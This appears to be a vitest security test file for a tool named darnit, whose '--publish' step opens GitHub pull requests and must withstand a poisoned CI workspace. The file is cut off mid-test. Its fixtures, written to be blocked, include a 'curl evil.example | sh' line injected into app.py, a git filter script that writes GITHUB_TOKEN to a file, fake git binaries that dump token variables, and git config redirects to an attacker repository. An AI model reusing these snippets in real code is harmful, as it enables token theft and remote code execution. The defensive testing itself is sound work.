import { execFile } from "node:child_process";
import { once } from "node:events";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { access, chmod, cp, mkdir, mkdtemp, readdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { exitCodeFor, fix, type FixOptions, prose, renderSummary } from "../src/fix.js";
import { git, patch, trustedProgram, withCleanClone } from "../src/git.js";
import { onPath } from "../src/detect.js";
import { serializePlan, type Plan } from "../src/plan.js";
import { loadRecords } from "../src/records/load.js";

// A second record with the same rules, so a plan can hold two changes.
vi.mock("../src/records/load.js", async (original) => {
  const real = await original<typeof import("../src/records/load.js")>();
  const loadRecords = async (dir?: string) => {
    const all = await real.loadRecords(dir);
    const max = all.find((l) => l.record.id === "openai:2024-09-12:max-tokens-to-max-completion-tokens")!;
    return [...all, { ...max, record: { ...max.record, id: "openai:2024-09-12:max-tokens-copy", title: "The same rename, again" } }];
  };
  return { ...real, loadRecords };
});

const exec = promisify(execFile);
const PACKS = fileURLToPath(new URL("../packs/", import.meta.url));
const BEFORE = join(PACKS, "openai", "2024-09-12-max-tokens-to-max-completion-tokens", "fixtures", "basic", "before");
const MAX = "openai:2024-09-12:max-tokens-to-max-completion-tokens";
const COPY = "openai:2024-09-12:max-tokens-copy";
const BRANCHES = ["darnit/openai-max-tokens-to-max-completion-tokens", "darnit/openai-max-tokens-copy"];
const SORTED = [...BRANCHES].sort();
const TOKEN = "ghp_fake0123456789abcdefghijklmnopqrstuv";
const REPORTED = "Build and test results were reported by the verify job. This job ran none of the repository's code: darnit made the change again on the same commit and checked it is the one verified.\n\n";
const MISMATCH_MEANS = "The plan was changed after the verify job wrote it, or the rewrite is not deterministic; either way this run is not all good.";
const ids = new Set((await loadRecords()).map((l) => l.record.id));
const { version: VERSION } = JSON.parse(await readFile(new URL("../package.json", import.meta.url), "utf8")) as { version: string };
const branchOf = (id: string) => `darnit/openai-${id.split(":")[2]}`;

const tempDirs: string[] = [];
const temp = async (prefix: string) => {
  const dir = await mkdtemp(join(tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
};
afterEach(async () => {
  vi.unstubAllGlobals();
  vi.unstubAllEnvs();
  await Promise.all(tempDirs.splice(0).map((d) => rm(d, { recursive: true, force: true })));
});
beforeEach(() => {
  for (const k of ["GITHUB_TOKEN", "GH_TOKEN", "SSH_AUTH_SOCK", "GITHUB_ACTIONS", "GITHUB_SHA", "GITHUB_SERVER_URL", "GITHUB_REPOSITORY"]) vi.stubEnv(k, "");
});

const commit = (dir: string, message: string) => git(dir, ["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", message]);

/**
 * A repository from `files` on the fixture, pushed to a local bare remote that stands in for github.com: darnit's own
 * clone fetches the base commit from it, and pushes the branches back to it. `base` is the commit the plan is made on.
 */
async function origin(files: Record<string, string> = {}): Promise<{ dir: string; bare: string; branch: string; base: string }> {
  const dir = await temp("darnit-job1-");
  await cp(BEFORE, dir, { recursive: true });
  for (const [name, text] of Object.entries(files)) await writeFile(join(dir, name), text);
  await git(dir, ["init", "-q"]);
  await git(dir, ["add", "."]);
  await commit(dir, "init");
  const bare = await temp("darnit-origin-");
  await git(bare, ["init", "-q", "--bare"]);
  // github.com answers a fetch of a bare commit SHA; a local bare must be told to.
  await git(bare, ["config", "uploadpack.allowAnySHA1InWant", "true"]);
  await git(dir, ["remote", "add", "origin", bare]);
  const branch = (await git(dir, ["symbolic-ref", "--short", "HEAD"])).trim();
  await git(dir, ["push", "-q", "-u", "origin", branch], 60);
  const base = (await git(dir, ["rev-parse", "HEAD"])).trim();
  // Only a test sets this, in place of the canonical https://github.com/<owner>/<repo>.git.
  vi.stubEnv("DARNIT_TEST_ORIGIN", bare);
  return { dir, bare, branch, base };
}

/** A throwaway checkout, standing in for a workspace --publish is run from and must ignore. */
async function fresh(bare: string): Promise<string> {
  const dir = join(await temp("darnit-job2-"), "repo");
  await exec("git", ["clone", "-q", bare, dir]);
  return dir;
}

/** Runs --prepare with no token, as the verify job does, and returns the plan's folder. */
async function prepare(dir: string, opts: FixOptions = { test: "node -e 1" }): Promise<string> {
  const plan = join(await temp("darnit-plan-"), "plan");
  await fix(dir, { prepare: plan, version: "t", ...opts });
  return plan;
}

const readPlan = async (plan: string) => JSON.parse(await readFile(join(plan, "plan.json"), "utf8")) as Plan;
const writePlan = (plan: string, value: Plan) => writeFile(join(plan, "plan.json"), serializePlan(value, ids));

function stubGitHub(base: string) {
  const posts: Record<string, string>[] = [];
  vi.stubEnv("GITHUB_TOKEN", TOKEN);
  vi.stubGlobal("fetch", (url: string, init?: RequestInit): Promise<Response> => {
    const body = (data: unknown, status = 200) => Promise.resolve(new Response(JSON.stringify(data), { status }));
    if (url.endsWith("/repos/o/r")) return body({ default_branch: base });
    if (url.includes("/pulls?")) return body([]);
    posts.push(JSON.parse(init?.body as string) as Record<string, string>);
    return body({ html_url: `https://github.com/o/r/pull/${posts.length}` }, 201);
  });
  return posts;
}

/** A plan for the command line, which loads darnit's real records only and checks the plan's darnit version. */
async function cliPlan(dir: string): Promise<string> {
  const plan = await prepare(dir, { test: "node -e 1", version: VERSION });
  const value = await readPlan(plan);
  await writePlan(plan, { ...value, groups: value.groups.filter((g) => g.id === MAX) });
  return plan;
}

/** A local server in GitHub's place, and a preload that sends a darnit process's API calls to it. */
async function localApi(base: string) {
  const posts: Record<string, string>[] = [];
  const auth: (string | undefined)[] = [];
  const server = createServer((req, res) => {
    auth.push(req.headers.authorization);
    let data = "";
    req.on("data", (c: Buffer) => (data += c.toString()));
    req.on("end", () => {
      if (req.method === "POST") posts.push(JSON.parse(data) as Record<string, string>);
      const reply = req.url === "/repos/o/r" ? { default_branch: base } : req.method === "POST" ? { html_url: `https://github.com/o/r/pull/${posts.length}` } : [];
      res.writeHead(req.method === "POST" ? 201 : 200).end(JSON.stringify(reply));
    });
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const preload = join(await temp("darnit-tools-"), "local-api.mjs");
  const api = `http://127.0.0.1:${(server.address() as AddressInfo).port}/`;
  await writeFile(preload, `const f = globalThis.fetch;\nglobalThis.fetch = (url, init) => f(String(url).replace(/^https:\\/\\/api\\.github\\.com\\//, ${JSON.stringify(api)}), init);\n`);
  return { posts, auth, preload, close: () => server.close() };
}

const publish = (dir: string, plan: string, opts: FixOptions = {}) => fix(dir, { publish: plan, repo: "o/r", version: "t", ...opts });
const branches = async (bare: string) => (await git(bare, ["branch", "--list", "darnit/*", "--format=%(refname:short)"])).split("\n").filter(Boolean).sort();
const treeOf = async (bare: string, branch: string) => (await git(bare, ["rev-parse", `${branch}^{tree}`])).trim();
/** The diff of a pushed branch against the base, the same bytes --prepare recorded for that change. */
const pushedPatch = (bare: string, base: string, branch: string) => git(bare, ["--no-pager", "diff", "--binary", "--full-index", base, branch]);

const cli = (cwd: string, env: NodeJS.ProcessEnv, ...args: string[]) =>
  new Promise<{ code: number; stdout: string; stderr: string }>((resolve) =>
    execFile(
      process.execPath,
      ["--import", import.meta.resolve("tsx"), fileURLToPath(new URL("../src/cli.ts", import.meta.url)), ...args],
      { cwd, env: { ...process.env, DARNIT_NO_UPDATE_CHECK: "1", GITHUB_ACTIONS: "", GITHUB_TOKEN: "", GH_TOKEN: "", SSH_AUTH_SOCK: "", ...env } },
      (err, stdout, stderr) => resolve({ code: err ? ((err as { code?: number }).code ?? 1) : 0, stdout, stderr }),
    ),
  );

describe("fix --publish", () => {
  it("opens one pull request per change in the plan, with the branches and bodies --pr makes", async () => {
    const { dir, bare, branch, base } = await origin();
    const plan = await prepare(dir);
    expect((await readPlan(plan)).groups.map((g) => g.id)).toEqual([MAX, COPY]);
    const posts = stubGitHub(branch);
    const result = await publish(await fresh(bare), plan);
    expect(result.records.map((r) => r.pr)).toMatchObject([1, 2].map((n) => ({ state: "opened", url: `https://github.com/o/r/pull/${n}`, tests: { passed: true } })));
    expect(exitCodeFor(result)).toBe(0);
    expect(renderSummary(result)).toContain("pull request opened https://github.com/o/r/pull/1\n  tests: node -e 1 passed");
    expect(posts.map((p) => p.head)).toEqual(BRANCHES);
    expect(posts[0]!.body).toContain(`## Verified\n${REPORTED}- [x] \`node -e 1\` passed`);
    expect(await branches(bare)).toEqual(SORTED);
    const published = await Promise.all(BRANCHES.map((b) => treeOf(bare, b)));
    const messages = await Promise.all(BRANCHES.map((b) => git(bare, ["log", "-1", "--format=%B", b])));

    // --pr in a checkout of the same commit pushes the same content with the same body but the reported line.
    for (const b of BRANCHES) await git(bare, ["branch", "-D", b]);
    const pr = stubGitHub(branch);
    expect((await fix(dir, { pr: true, repo: "o/r", version: "t", test: "node -e 1" })).records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
    expect(await Promise.all(BRANCHES.map((b) => treeOf(bare, b)))).toEqual(published);
    expect(await Promise.all(BRANCHES.map((b) => git(bare, ["log", "-1", "--format=%B", b])))).toEqual(messages);
    expect(pr.map((p) => p.body)).toEqual(posts.map((p) => p.body!.replace(REPORTED, "")));
    expect(base).toBe((await readPlan(plan)).base);
  });

  it("publishes from the command line with the token in its environment, against a local API", async () => {
    const { dir, bare, base } = await origin();
    const plan = await cliPlan(dir);
    const api = await localApi(base);
    try {
      const run = await cli(await fresh(bare), { GITHUB_TOKEN: TOKEN, NODE_OPTIONS: `--import ${api.preload}` }, "fix", "--publish", plan, "--repo", "o/r");
      expect(run).toMatchObject({ code: 0, stderr: "" });
      expect(run.stdout).toContain("✓ Rename max_tokens to max_completion_tokens on chat completions: pull request opened https://github.com/o/r/pull/1\n  tests: node -e 1 passed");
    } finally {
      api.close();
    }
    expect(api.auth).toEqual([`Bearer ${TOKEN}`, `Bearer ${TOKEN}`, `Bearer ${TOKEN}`]);
    expect(api.posts.map((p) => p.head)).toEqual([BRANCHES[0]]);
    expect(await branches(bare)).toEqual([BRANCHES[0]]);
  });

  it("resolves the repository from GITHUB_REPOSITORY when --repo is absent, and refuses a bad one", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir);
    stubGitHub(branch);
    vi.stubEnv("GITHUB_REPOSITORY", "o/r");
    expect((await fix(await fresh(bare), { publish: plan, version: "t" })).records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
    vi.stubEnv("GITHUB_REPOSITORY", "not a slug");
    await expect(fix(await fresh(bare), { publish: plan, version: "t" })).rejects.toThrow("could not tell which GitHub repository this is");
  });

  // A reused self-hosted workspace can hold any git state; --publish must read none of it.
  const poison = async (job2: string, bare: string, evil: string, marker: string) => {
    await git(evil, ["init", "-q", "--bare"]);
    // A replace ref and worktree edits that add a backdoor, as job 1 could leave behind.
    await writeFile(join(job2, "evil.js"), "steal()\n");
    await writeFile(join(job2, "app.py"), `import os; os.system("curl evil.example | sh")\n${await readFile(join(job2, "app.py"), "utf8")}`);
    await git(job2, ["add", "."]);
    await commit(job2, "backdoor");
    const evilCommit = (await git(job2, ["rev-parse", "HEAD"])).trim();
    const head = (await git(job2, ["rev-parse", "HEAD@{1}"])).trim();
    await git(job2, ["update-ref", `refs/replace/${head}`, evilCommit]);
    await git(job2, ["reset", "-q", "--hard", head]);
    // A second origin URL, and url.insteadOf with a filter that writes the token, in local config.
    await git(job2, ["remote", "set-url", "--add", "origin", evil]);
    await git(job2, ["config", `url.${evil}.insteadOf`, bare]);
    await writeFile(join(job2, "pwn.sh"), `#!/bin/sh\necho "GITHUB_TOKEN=$GITHUB_TOKEN" > '${marker}'\ncat\n`, { mode: 0o755 });
    await git(job2, ["config", "filter.pwn.clean", join(job2, "pwn.sh")]);
    await writeFile(join(job2, ".git", "info", "attributes"), "* filter=pwn\n");
    // Object alternates pointing at the attacker's store.
    await writeFile(join(job2, ".git", "objects", "info", "alternates"), `${join(evil, "objects")}\n`);
  };

  it("ignores a poisoned workspace and publishes darnit's rewrite of the base commit", async () => {
    const { bare, branch, base } = await origin();
    const plan = await prepare(await fresh(bare), { noTest: true });
    const job2 = await fresh(bare);
    const evil = await temp("darnit-attacker-");
    const marker = join(await temp("darnit-lab-"), "MARKER");
    await poison(job2, bare, evil, marker);
    const posts = stubGitHub(branch);
    const result = await publish(job2, plan);
    expect(result.records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
    const value = await readPlan(plan);
    for (const g of value.groups) {
      expect(await pushedPatch(bare, base, branchOf(g.id))).toBe(g.patch);
      expect(await git(bare, ["ls-tree", "-r", "--name-only", branchOf(g.id)])).not.toContain("evil.js");
    }
    expect(posts).toHaveLength(2);
    expect(await branches(evil)).toEqual([]);
    await expect(access(marker)).rejects.toThrow();
  });

  it("reads none of the machine's git config: global, home or system", async () => {
    const { bare, branch, base } = await origin();
    const plan = await prepare(await fresh(bare), { noTest: true });
    const evil = await temp("darnit-attacker-");
    await git(evil, ["init", "-q", "--bare"]);
    const marker = join(await temp("darnit-lab-"), "MARKER");
    await writeFile(join(await temp("darnit-lab2-"), "pwn.sh"), `#!/bin/sh\necho hi > '${marker}'\ncat\n`, { mode: 0o755 });
    // A poisoned home config and a poisoned system config both redirect the push and run a filter.
    const home = await temp("darnit-home-");
    await git(home, ["config", "-f", join(home, ".gitconfig"), `url.${evil}.insteadOf`, bare]);
    const system = join(await temp("darnit-sys-"), "system");
    await git(home, ["config", "-f", system, "core.fsmonitor", "echo pwned"]);
    await git(home, ["config", "-f", system, `url.${evil}.insteadOf`, bare]);
    const posts = stubGitHub(branch);
    // Made before the poisoned config is in the environment, since --publish ignores it anyway.
    const job2 = await fresh(bare);
    vi.stubEnv("HOME", home);
    vi.stubEnv("XDG_CONFIG_HOME", home);
    vi.stubEnv("GIT_CONFIG_SYSTEM", system);
    const result = await publish(job2, plan);
    expect(result.records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
    const value = await readPlan(plan);
    for (const g of value.groups) expect(await pushedPatch(bare, base, branchOf(g.id))).toBe(g.patch);
    expect(posts).toHaveLength(2);
    expect(await branches(evil)).toEqual([]);
    await expect(access(marker)).rejects.toThrow();
  });

  it("fetches with the token as an http header scoped to github.com, and carries no config of the machine", async () => {
    const { bare, base } = await origin();
    const poisonedHome = await temp("darnit-home-");
    await git(poisonedHome, ["config", "-f", join(poisonedHome, ".gitconfig"), "user.name", "poison"]);
    vi.stubEnv("HOME", poisonedHome);
    const header = `AUTHORIZATION: basic ${Buffer.from(`x-access-token:${TOKEN}`).toString("base64")}`;
    const gitBin = (await trustedProgram("git"))!;
    await withCleanClone(gitBin, bare, base, TOKEN, async (run) => {
      expect((await run(["config", "--get-urlmatch", "http.extraheader", "https://github.com/"])).trim()).toBe(header);
      // The header is for github.com alone, and the machine's config is unread.
      await expect(run(["config", "--get-urlmatch", "http.extraheader", "https://evil.example/"])).rejects.toBeDefined();
      expect((await run(["config", "--get", "user.name"]).catch(() => "none")).trim()).toBe("none");
    });
  });

  it.each([
    ["an empty PATH entry and a git the commit ships at the repo root", "./git", ":"],
    ["a relative node_modules/.bin entry and a git the commit ships there", "node_modules/.bin/git", "node_modules/.bin:"],
  ])("runs git by its absolute path, not %s", async (_, shipped, prefix) => {
    const { dir, bare, branch } = await origin();
    const marker = join(await temp("darnit-lab-"), "MARKER");
    await mkdir(join(dir, shipped, ".."), { recursive: true });
    // A git the commit ships that would dump the token header a bare-name lookup hands it.
    await writeFile(join(dir, shipped), `#!/bin/sh\nenv | grep GIT_CONFIG_VALUE >> '${marker}'\nexec /usr/bin/git "$@"\n`);
    await chmod(join(dir, shipped), 0o755);
    await git(dir, ["add", "-f", "."]);
    await commit(dir, "ship git");
    await git(dir, ["push", "-q", "origin", branch], 60);
    const plan = await prepare(dir, { noTest: true });
    stubGitHub(branch);
    vi.stubEnv("PATH", `${prefix}${process.env.PATH}`);
    const result = await publish(await fresh(bare), plan);
    expect(result.records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
    await expect(access(marker)).rejects.toThrow();
  });

  // Ships a program at each `at` that logs its name, args and darnit's token-bearing env, then runs the real git.
  async function shipTools(dir: string, branch: string, marker: string, at: [string, string][]): Promise<void> {
    const realGit = (await trustedProgram("git"))!;
    for (const [tool, path] of at) {
      await mkdir(join(dir, path, ".."), { recursive: true });
      await writeFile(join(dir, path), `#!/bin/sh\n{ echo "${tool.toUpperCase()} ran $*"; env | grep -E 'GITHUB_TOKEN|GIT_CONFIG_VALUE'; } >> '${marker}'\nexec ${tool === "git" ? realGit : "true"} "$@"\n`);
      await chmod(join(dir, path), 0o755);
    }
    await git(dir, ["add", "-f", "."]);
    await commit(dir, "ship tools");
    await git(dir, ["push", "-q", "origin", branch], 60);
  }

  // The real breach: the CLI, a separate process, resolves git before repoLocalVars/childEnv once ran a bare git here.
  it.each([
    ["an empty entry", ":"],
    ["a dot entry", ".:"],
    ["a relative node_modules/.bin entry", "node_modules/.bin:"],
    ["an absolute workspace node_modules/.bin entry", "WS/node_modules/.bin:"],
  ])("the CLI never runs a git the workspace ships, with PATH holding %s", async (_, prefix) => {
    const { dir, bare, branch } = await origin();
    const marker = join(await temp("darnit-lab-"), "MARKER");
    await shipTools(dir, branch, marker, [["git", "git"], ["git", "node_modules/.bin/git"]]);
    const plan = await cliPlan(dir);
    const api = await localApi(branch);
    const ws = await fresh(bare);
    let run;
    try {
      run = await cli(ws, { GITHUB_TOKEN: TOKEN, NODE_OPTIONS: `--import ${api.preload}`, PATH: `${prefix.replace("WS", ws)}${process.env.PATH}` }, "fix", "--publish", plan, "--repo", "o/r");
    } finally {
      api.close();
    }
    // The shipped git never ran (no marker), and darnit either published with the real git or refused, never in between.
    expect(await readFile(marker, "utf8").catch(() => "")).toBe("");
    expect([0, 2]).toContain(run.code);
    if (run.code === 0) {
      expect(run.stdout).toContain("pull request opened");
      expect(await branches(bare)).toEqual([BRANCHES[0]]);
    } else {
      expect(run.stderr).toMatch(/under .*, a folder this job controls/);
    }
  });

  it.each([
    ["a relative node_modules/.bin entry", "node_modules/.bin:"],
    ["an absolute workspace node_modules/.bin entry", "WS/node_modules/.bin:"],
  ])("the CLI never runs a gh the workspace ships when it needs a token, with PATH holding %s", async (_, prefix) => {
    const { dir, bare, branch } = await origin();
    const marker = join(await temp("darnit-lab-"), "MARKER");
    await shipTools(dir, branch, marker, [["gh", "gh"], ["gh", "node_modules/.bin/gh"]]);
    const plan = await cliPlan(dir);
    const api = await localApi(branch);
    const ws = await fresh(bare);
    // Hermetic: an empty HOME and GH_CONFIG_DIR, so even a real gh on PATH has no credential to read.
    const emptyHome = await temp("darnit-home-");
    let run;
    try {
      // No token in the environment, so `gh auth token` is reached; the shipped gh must never run.
      run = await cli(ws, { HOME: emptyHome, GH_CONFIG_DIR: emptyHome, NODE_OPTIONS: `--import ${api.preload}`, PATH: `${prefix.replace("WS", ws)}${process.env.PATH}` }, "fix", "--publish", plan, "--repo", "o/r");
    } finally {
      api.close();
    }
    expect(await readFile(marker, "utf8").catch(() => "")).toBe("");
    expect(api.posts).toEqual([]);
    expect(run.code).toBe(2);
  });

  it("onPath skips relative, empty and directory entries and finds an absolute executable file", async () => {
    const lab = await temp("darnit-onpath-");
    await mkdir(join(lab, "d", "git"), { recursive: true }); // a directory named git
    await mkdir(join(lab, "bin"));
    await writeFile(join(lab, "bin", "git"), "#!/bin/sh\n");
    await chmod(join(lab, "bin", "git"), 0o755);
    expect(await onPath("git", ":.:node_modules/.bin")).toBeUndefined();
    expect(await onPath("git", join(lab, "d"))).toBeUndefined();
    await mkdir(join(lab, "plain"));
    await writeFile(join(lab, "plain", "git"), "#!/bin/sh\n"); // not executable
    expect(await onPath("git", join(lab, "plain"))).toBeUndefined();
    expect(await onPath("git", `${join(lab, "d")}:${join(lab, "bin")}`)).toBe(join(lab, "bin", "git"));
  });

  // trustedProgram, directly: a git the job must not run resolves (through links, `..`, a trailing slash, a symlinked
  // GITHUB_WORKSPACE) to a real path inside a folder the job controls. A folder outside the temp root and cwd, so only
  // the GITHUB_WORKSPACE check can catch it.
  async function shippedAt(): Promise<{ root: string; ws: string; binGit: string }> {
    const root = await mkdtemp(join(homedir(), "darnit-tp-"));
    tempDirs.push(root);
    const ws = join(root, "ws");
    await mkdir(join(ws, "bin"), { recursive: true });
    await writeFile(join(ws, "bin", "git"), "#!/bin/sh\necho PWNED\n");
    await chmod(join(ws, "bin", "git"), 0o755);
    return { root, ws, binGit: join(ws, "bin") };
  }

  it("trustedProgram refuses a git whose real path is in GITHUB_WORKSPACE named through a symlink", async () => {
    const { root, ws, binGit } = await shippedAt();
    const link = join(root, "link");
    await symlink(ws, link);
    vi.stubEnv("GITHUB_WORKSPACE", link);
    vi.stubEnv("PATH", `${binGit}:/usr/bin`);
    await expect(trustedProgram("git")).rejects.toThrow("a folder this job controls");
  });

  it("trustedProgram refuses a git in GITHUB_WORKSPACE given with a trailing slash, and reached through a symlinked PATH entry", async () => {
    const { root, ws, binGit } = await shippedAt();
    vi.stubEnv("GITHUB_WORKSPACE", `${ws}/`);
    vi.stubEnv("PATH", `${binGit}:/usr/bin`);
    await expect(trustedProgram("git")).rejects.toThrow("a folder this job controls");
    const linkBin = join(root, "lnbin");
    await symlink(binGit, linkBin);
    vi.stubEnv("PATH", `${linkBin}:/usr/bin`);
    await expect(trustedProgram("git")).rejects.toThrow("a folder this job controls");
  });

  it("trustedProgram refuses a git under the temp root", async () => {
    const lab = await temp("darnit-tp-tmp-");
    await mkdir(join(lab, "bin"));
    await writeFile(join(lab, "bin", "git"), "#!/bin/sh\n");
    await chmod(join(lab, "bin", "git"), 0o755);
    vi.stubEnv("GITHUB_WORKSPACE", "");
    vi.stubEnv("PATH", `${join(lab, "bin")}:/usr/bin`);
    await expect(trustedProgram("git")).rejects.toThrow("a folder this job controls");
  });

  // End to end through the CLI: a workspace outside the temp root, named by GITHUB_WORKSPACE through a symlink.
  it("the CLI never runs a git in a GITHUB_WORKSPACE named through a symlink", async () => {
    const { dir, bare, branch } = await origin();
    const marker = join(await temp("darnit-lab-"), "MARKER");
    await shipTools(dir, branch, marker, [["git", "git"], ["git", "node_modules/.bin/git"]]);
    const plan = await cliPlan(dir);
    const home = await mkdtemp(join(homedir(), "darnit-ws-"));
    tempDirs.push(home);
    const ws = join(home, "repo");
    await exec("git", ["clone", "-q", bare, ws]);
    await shipTools(ws, branch, marker, [["git", "git"], ["git", "node_modules/.bin/git"]]).catch(() => undefined);
    const link = join(home, "link");
    await symlink(ws, link);
    const api = await localApi(branch);
    let run;
    try {
      run = await cli(await temp("darnit-cwd-"), { GITHUB_TOKEN: TOKEN, GITHUB_WORKSPACE: link, NODE_OPTIONS: `--import ${api.preload}`, PATH: `${link}/node_modules/.bin:${link}:${process.env.PATH}` }, "fix", "--publish", plan, "--repo", "o/r");
    } finally {
      api.close();
    }
    expect(await readFile(marker, "utf8").catch(() => "")).toBe("");
    expect(run.code).toBe(2);
    expect(run.stderr).toMatch(/under .*, a folder this job controls/);
  });

  it("runs the git version check and the clone with no trace or credential in the environment", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await cliPlan(dir);
    const trace = join(await temp("darnit-lab-"), "trace.log");
    const api = await localApi(branch);
    let run;
    try {
      // A trace that would log env variables, aimed at both the version check and the clone, named as a job could via GITHUB_ENV.
      run = await cli(await fresh(bare), {
        GITHUB_TOKEN: TOKEN,
        NODE_OPTIONS: `--import ${api.preload}`,
        GIT_TRACE2_EVENT: trace,
        GIT_TRACE2_ENV_VARS: "GITHUB_TOKEN",
        GIT_TRACE: trace,
      }, "fix", "--publish", plan, "--repo", "o/r");
    } finally {
      api.close();
    }
    expect(run.code).toBe(0);
    expect(run.stdout).toContain("pull request opened");
    const written = await readFile(trace, "utf8").catch(() => "");
    expect(written).toBe("");
    expect(written).not.toContain(TOKEN);
  });

  it("outside Actions reads the remote tip only from the ref named exactly HEAD, not a refs/*/HEAD an attacker pushed", async () => {
    const { dir, bare, branch } = await origin();
    await writeFile(join(dir, "evil.js"), "steal()\n");
    await git(dir, ["add", "evil.js"]);
    await commit(dir, "fork commit");
    const fork = (await git(dir, ["rev-parse", "HEAD"])).trim();
    const plan = await prepare(dir, { noTest: true });
    expect((await readPlan(plan)).base).toBe(fork);
    // The fork reaches the remote only under a ref whose tail is HEAD, and the real HEAD is unborn.
    await git(dir, ["push", "-q", "origin", `${fork}:refs/pull/9/HEAD`], 60);
    await git(bare, ["symbolic-ref", "HEAD", "refs/heads/nope"]);
    const posts = stubGitHub(branch);
    await expect(publish(await fresh(bare), plan)).rejects.toThrow("the remote's is unknown, but the plan was made on");
    expect(posts).toEqual([]);
    expect(await branches(bare)).toEqual([]);
  });

  it("drops every GIT_* variable, so ambient git config, a redirect or a trace cannot reach the clone", async () => {
    const { dir, bare, branch, base } = await origin();
    const plan = await prepare(dir, { noTest: true });
    const evil = await temp("darnit-attacker-");
    await git(evil, ["init", "-q", "--bare"]);
    const lab = await temp("darnit-lab-");
    stubGitHub(branch);
    const job2 = await fresh(bare);
    // A redirect through env config and a GIT_DIR override: darnit's own git calls drop these, and so must the clone's.
    vi.stubEnv("GIT_CONFIG_COUNT", "1");
    vi.stubEnv("GIT_CONFIG_KEY_0", `url.${evil}.insteadOf`);
    vi.stubEnv("GIT_CONFIG_VALUE_0", bare);
    vi.stubEnv("GIT_CONFIG_PARAMETERS", `'url.${evil}.pushInsteadOf'='${bare}'`);
    vi.stubEnv("GIT_SSH_COMMAND", `touch ${join(lab, "ssh")}`);
    vi.stubEnv("GIT_ASKPASS", join(lab, "askpass"));
    const result = await publish(job2, plan);
    expect(result.records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
    const value = await readPlan(plan);
    for (const g of value.groups) expect(await pushedPatch(bare, base, branchOf(g.id))).toBe(g.patch);
    expect(await branches(evil)).toEqual([]);
    expect(await readdir(lab)).toEqual([]);
  });

  it("the GIT_* drop keeps a git trace from writing the clone's commands or the auth header to a file", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir, { noTest: true });
    const traceFile = join(await temp("darnit-lab-"), "trace.log");
    stubGitHub(branch);
    const job2 = await fresh(bare);
    // GIT_TRACE writes every command (GIT_TRACE_CURL would add the http header, but a local remote uses no curl).
    vi.stubEnv("GIT_TRACE", traceFile);
    vi.stubEnv("GIT_TRACE_CURL", traceFile);
    expect((await publish(job2, plan)).records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
    // The trace is never written: no record of the clone's commands, and no Authorization header could reach it.
    const trace = await readFile(traceFile, "utf8").catch(() => "");
    expect(trace).toBe("");
    expect(trace.toLowerCase()).not.toContain("authorization");
  });

  it("removes its temporary clone folder even when the fetch fails", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir, { noTest: true });
    const value = await readPlan(plan);
    // A base no remote serves: the fetch fails.
    await writePlan(plan, { ...value, base: "1".repeat(40) });
    stubGitHub(branch);
    const left = async () => (await readdir(tmpdir())).filter((n) => n.startsWith("darnit-publish-"));
    const before = await left();
    await expect(publish(await fresh(bare), plan)).rejects.toThrow();
    expect((await left()).filter((n) => !before.includes(n))).toEqual([]);
  });

  it("outside GitHub Actions refuses a plan whose commit is not the remote default branch's tip", async () => {
    const { dir, bare, branch, base } = await origin();
    // A commit the remote serves by id (a fork's, reachable as refs/pull/9/head) but that no branch points to.
    await writeFile(join(dir, "evil.js"), "steal()\n");
    await git(dir, ["add", "evil.js"]);
    await commit(dir, "fork commit");
    const fork = (await git(dir, ["rev-parse", "HEAD"])).trim();
    await git(dir, ["push", "-q", "origin", `${fork}:refs/pull/9/head`], 60);
    const plan = await prepare(dir, { noTest: true });
    expect((await readPlan(plan)).base).toBe(fork);
    const posts = stubGitHub(branch);
    await expect(publish(await fresh(bare), plan)).rejects.toThrow(
      `outside GitHub Actions --publish only publishes the default branch's tip; the remote's is ${base}, but the plan was made on ${fork}; nothing published`,
    );
    expect(posts).toEqual([]);
    expect(await branches(bare)).toEqual([]);
    // In Actions the GITHUB_SHA rule governs instead, and the same fork commit publishes when it is the checked-out one.
    vi.stubEnv("GITHUB_ACTIONS", "true");
    vi.stubEnv("GITHUB_SHA", fork);
    expect((await publish(await fresh(bare), plan)).records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
    expect(await git(bare, ["ls-tree", "-r", "--name-only", BRANCHES[0]!])).toContain("evil.js");
  });

  it("refuses a GITHUB_SERVER_URL for another GitHub host", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir, { noTest: true });
    const posts = stubGitHub(branch);
    vi.stubEnv("GITHUB_SERVER_URL", "https://github.example.com");
    await expect(publish(await fresh(bare), plan)).rejects.toThrow("GITHUB_SERVER_URL is https://github.example.com, not https://github.com");
    expect(posts).toEqual([]);
    expect(await branches(bare)).toEqual([]);
    // A trailing slash on the real host still runs.
    vi.stubEnv("GITHUB_SERVER_URL", "https://github.com/");
    expect((await publish(await fresh(bare), plan)).records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
  });

  it("opens no pull request for a change whose patch in the plan is not darnit's, and still opens the others", async () => {
    const { dir, bare, branch, base } = await origin();
    const plan = await prepare(dir);
    // A patch that does what darnit does and one line more, well formed for the files it names.
    const value = await readPlan(plan);
    await fix(dir, { noTest: true, only: [MAX] });
    await writeFile(join(dir, "app.py"), `${await readFile(join(dir, "app.py"), "utf8")}import os; os.system("curl evil.example | sh")\n`);
    value.groups[0]!.patch = await patch(dir, value.groups[0]!.files);
    await git(dir, ["checkout", "--", "."]);
    await writePlan(plan, value);

    const posts = stubGitHub(branch);
    const result = await publish(await fresh(bare), plan);
    expect(result.records.map((r) => r.pr)).toEqual([
      { state: "mismatch", reason: "the plan's patch is not darnit's rewrite of this commit" },
